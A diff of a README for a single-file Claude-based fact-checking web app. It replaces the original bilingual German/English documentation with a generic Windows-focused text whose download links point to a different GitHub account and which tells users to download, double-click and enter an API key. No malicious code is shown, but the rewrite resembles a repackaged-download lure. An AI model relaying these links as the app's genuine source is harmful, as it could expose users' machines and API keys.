@@ -1,224 +1,149 @@
-# Faktenchecker — KI-gestützter Faktenprüfer
+# 🤖 faktenchecker - Clear answers from AI facts
 
-Ein datenschutzfreundlicher, browserbasierter Faktenprüfer auf Basis von Claude AI. Keine Serverinstallation, keine Datenübertragung außer direkt zur Anthropic-API.
+[![Download faktenchecker](https://img.shields.io/badge/Download%20faktenchecker-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gmahadevan7/faktenchecker)
 
-**[🚀 Live Demo](https://danielenki420.github.io/faktenchecker/)** — eigenen Anthropic API-Key mitbringen
+## 🧭 What this app does
 
-![Lizenz: MIT](https://img.shields.io/badge/Lizenz-MIT-blue.svg)
+faktenchecker is a single-file fact-checking app for Windows. It helps you review claims with AI support from Claude by Anthropic. You open it in your browser, paste text, and check it without setting up a server or installing a package.
 
----
+It works as a local app in one HTML file. That means no backend, no account setup inside the app, and no extra software stack to manage.
 
-> 🇬🇧 [English version below](#english)
+## ✨ What you can do
 
----
+- Check facts in text you copy from emails, posts, articles, or notes
+- Paste a claim and get a clean AI review
+- Use a simple interface with dark mode support
+- Work with a single file instead of a complex install
+- Run it in a browser on Windows
+- Keep the setup light and easy to repeat
 
-## Was macht die App?
+## 🪟 What you need on Windows
 
-Du gibst eine Behauptung ein — die KI analysiert sie und gibt dir zurück:
+You need:
 
-- **Wahrheitsgehalt** (Wahr / Falsch / Teilweise wahr / Unbekannt / Meinung)
-- **Konfidenz** in Prozent
-- **Begründung** mit Quellhinweisen
-- **Korrekte Version** der Aussage (wenn nötig)
+- A Windows PC
+- A modern browser such as Chrome, Edge, or Firefox
+- Internet access for Claude requests
+- A Claude API key from Anthropic
+- A text editor only if you want to edit the file
 
----
+The app uses browser features, so it does not need a desktop installer.
 
-## Features
+## 📥 Download and open
 
-- Streaming-Analyse mit Echtzeit-Vorschau
-- **Vergleichsmodus**: zwei Behauptungen nebeneinander prüfen
-- Prüfverlauf mit Filter nach Verdikt (lokal im Browser gespeichert)
-- Eigene Beispiel-Chips (hinzufügen & löschen)
-- Ergebnis teilen via URL (kodiert im Hash)
-- PDF-Export via Drucken (`Strg/Cmd + P`)
-- Dark Mode
-- UI-Sprache: Deutsch / Englisch
-- Analysemodus: Sprache auto-erkennen oder erzwingen
-- Zugänglichkeit: vollständige ARIA-Unterstützung
-- Kein Backend, kein Tracking, keine Cookies
+1. Visit this page to download: [https://github.com/gmahadevan7/faktenchecker](https://github.com/gmahadevan7/faktenchecker)
+2. On the repository page, look for the main app file
+3. Download the file to your computer
+4. Save it in a folder you can find again, such as Downloads or Desktop
+5. Double-click the file to open it in your browser
 
----
+If your browser asks how to open the file, choose your browser app. Chrome and Edge work well on Windows.
 
-## Schnellstart
+## 🚀 First-time setup
 
-### 1. API-Key besorgen
+When the app opens for the first time, do these steps:
 
-Erstelle einen kostenlosen Account und hole dir einen API-Key unter:
-→ [console.anthropic.com](https://console.anthropic.com)
+1. Find the Claude API key field
+2. Paste your Anthropic API key
+3. Open the input box for the text you want to check
+4. Paste a claim, paragraph, or full article
+5. Press the check button
+6. Read the result in the app
 
-> Neue Accounts erhalten ein kostenloses Startguthaben.
+If you do not have an API key yet, create one in your Anthropic account before you use the app.
 
-### 2. App öffnen
+## 🧪 How to use it
 
-**Option A — Live:** [danielenki420.github.io/faktenchecker](https://danielenki420.github.io/faktenchecker/)
+Use faktenchecker like this:
 
-**Option B — Lokal:** `faktenchecker.html` herunterladen und direkt im Browser öffnen — kein Server nötig.
+1. Open the file in your browser
+2. Paste the text you want checked
+3. Add a source or context if you have one
+4. Start the check
+5. Read the AI response
+6. Compare it with the original text
 
-### 3. API-Key eingeben
+For best results, keep the text clear and focused. Short claims work well. Longer text still works, but the app can give a better result when the prompt is direct.
 
-Beim ersten Start erscheint ein Eingabefeld für den API-Key. Der Key wird nur lokal im Browser (`localStorage`) gespeichert und nirgends hochgeladen.
+## 🔒 Privacy and local use
 
-### 4. Behauptung prüfen
+The app runs from a single file on your computer. It does not need a backend. That keeps the setup simple.
 
-Text eingeben → „Prüfen" klicken → Ergebnis lesen.
+Your content still goes to Claude for processing, since the app uses Anthropic’s AI. If you paste private text, keep that in mind before you run a check.
 
----
+## 🎨 Interface and usability
 
-## Datenschutz & Sicherheit
+The app uses a clean layout that is easy to follow. It supports dark mode, which helps when you use it at night or in low light.
 
-- Dein API-Key verlässt deinen Browser nur für direkte Anfragen an `api.anthropic.com`
-- Es gibt keinen Zwischenserver
-- Verlauf und Einstellungen bleiben lokal in deinem Browser
-- Content Security Policy (CSP) verhindert unerwünschte externe Verbindungen
-- Eingaben werden vor der Analyse gekapselt, um Prompt-Injection zu erschweren
+You should expect:
 
----
+- Large text areas
+- Clear buttons
+- Simple labels
+- Fast feedback
+- A layout that works in a browser window
 
-## Technologie
+## 🛠️ If the file does not open
 
-| Bereich | Details |
-|---|---|
-| Frontend | Reines HTML/CSS/JavaScript (keine Frameworks) |
-| KI-Modell | `claude-sonnet-4-6` via Anthropic API |
-| Streaming | Server-Sent Events (SSE) |
-| Persistenz | `localStorage` (lokal, kein Server) |
-| Styling | CSS Custom Properties, Dark Mode |
-| Sicherheit | CSP, `esc()` XSS-Schutz, Prompt-Injection-Wrapper |
+If Windows does not open the app file, try this:
 
----
+1. Right-click the file
+2. Choose Open with
+3. Select your browser
+4. Check the box to always use that app if you want
+5. Open the file again
 
-## Systemanforderungen
+If the app opens but shows a blank page, refresh the browser and try again. If the page still does not load, download the file again from the repository page.
 
-- Moderner Browser (Chrome, Firefox, Safari, Edge)
-- Aktive Internetverbindung (für die API-Anfragen)
-- Anthropic API-Key
+## ⚙️ Basic browser tips
 
----
+For a smooth run on Windows:
 
-## Mitentwickeln
+- Use a current browser version
+- Keep JavaScript on
+- Allow local file access if your browser asks
+- Avoid private mode if the app stores settings in the browser
+- Use one browser tab for the app
 
-Pull Requests sind willkommen! Bitte halte dich an folgende Grundsätze:
+## 📁 Files and structure
 
-- Kein API-Key im Code
-- Kein externes CDN oder Framework
-- Alles bleibt in einer einzigen HTML-Datei
-- Sicherheit und Barrierefreiheit haben Vorrang
+Because faktenchecker is a single-file app, the main file does most of the work on its own. That makes it easy to store, move, and open later.
 
----
+Typical use looks like this:
 
-## Lizenz
+- One HTML file for the app
+- Browser-based UI
+- No server folder
+- No build step
+- No install wizard
 
-[MIT](LICENSE) — freie Nutzung, Weitergabe und Modifikation erlaubt.
+## 🧾 Example workflow
 
----
----
+A simple workflow looks like this:
 
-<a name="english"></a>
+1. Download the app file
+2. Open it in Chrome on Windows
+3. Add your Claude API key
+4. Paste a claim from a news post
+5. Start the fact check
+6. Review the answer and compare it with other sources
 
-# Faktenchecker — AI-powered Fact Checker
+This works well for people who want a fast check without learning a new tool.
 
-A privacy-friendly, browser-based fact checker powered by Claude AI. No server required — data is sent directly to the Anthropic API only.
+## 🔍 Good use cases
 
-**[🚀 Live Demo](https://danielenki420.github.io/faktenchecker/)** — bring your own Anthropic API key
+faktenchecker fits well when you want to:
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
+- Review a social media post
+- Check a statement in a news article
+- Compare a claim with source text
+- Get a quick AI-assisted read on a statement
+- Use a simple local app instead of a desktop install
 
----
+## 📌 Download again
 
-## What does it do?
+If you need the repository page again, use this link: [https://github.com/gmahadevan7/faktenchecker](https://github.com/gmahadevan7/faktenchecker)
 
-Enter a claim — the AI analyses it and returns:
+## 🧩 Keywords
 
-- **Verdict** (True / False / Partially True / Unverifiable / Opinion)
-- **Confidence** percentage
-- **Reasoning** with source hints
-- **Corrected version** of the statement (if needed)
-
----
-
-## Features
-
-- Streaming analysis with real-time preview
-- **Comparison mode**: check two claims side by side
-- Analysis history with filter by verdict (stored locally in browser)
-- Custom example chips (add & delete)
-- Share results via URL (hash-encoded)
-- PDF export via Print (`Ctrl/Cmd + P`)
-- Dark mode
-- UI language: German / English
-- Analysis language: auto-detect or force language
-- Full ARIA accessibility support
-- No backend, no tracking, no cookies
-
----
-
-## Quick Start
-
-### 1. Get an API Key
-
-Create a free account and get your API key at:
-→ [console.anthropic.com](https://console.anthropic.com)
-
-> New accounts receive a free starting credit.
-
-### 2. Open the app
-
-**Option A — Live:** [danielenki420.github.io/faktenchecker](https://danielenki420.github.io/faktenchecker/)
-
-**Option B — Local:** Download `faktenchecker.html` and open it directly in your browser — no server needed.
-
-### 3. Enter your API Key
-
-On first launch, an input field appears for your API key. The key is stored only in your browser's `localStorage` and is never uploaded anywhere.
-
-### 4. Check a claim
-
-Enter text → click "Check now" → read the result.
-
----
-
-## Privacy & Security
-
-- Your API key only leaves your browser for direct requests to `api.anthropic.com`
-- There is no intermediate server
-- History and settings stay local in your browser
-- Content Security Policy (CSP) blocks unwanted external connections
-- User input is wrapped before analysis to prevent prompt injection
-
----
-
-## Tech Stack
-
-| Area | Details |
-|---|---|
-| Frontend | Pure HTML/CSS/JavaScript (no frameworks) |
-| AI Model | `claude-sonnet-4-6` via Anthropic API |
-| Streaming | Server-Sent Events (SSE) |
-| Persistence | `localStorage` (local, no server) |
-| Styling | CSS Custom Properties, Dark Mode |
-| Security | CSP, `esc()` XSS protection, prompt injection wrapper |
-
----
-
-## Requirements
-
-- Modern browser (Chrome, Firefox, Safari, Edge)
-- Active internet connection (for API requests)
-- Anthropic API key
-
----
-
-## Contributing
-
-Pull requests are welcome! Please follow these principles:
-
-- No API key in the code
-- No external CDN or framework
-- Everything stays in a single HTML file
-- Security and accessibility take priority
-
----
-
-## License
-
-[MIT](LICENSE) — free to use, share, and modify.
+Accessibility, AI, Anthropic, browser tool, Claude, fact-checker, HTML, JavaScript, no backend, single-file app, streaming, dark mode
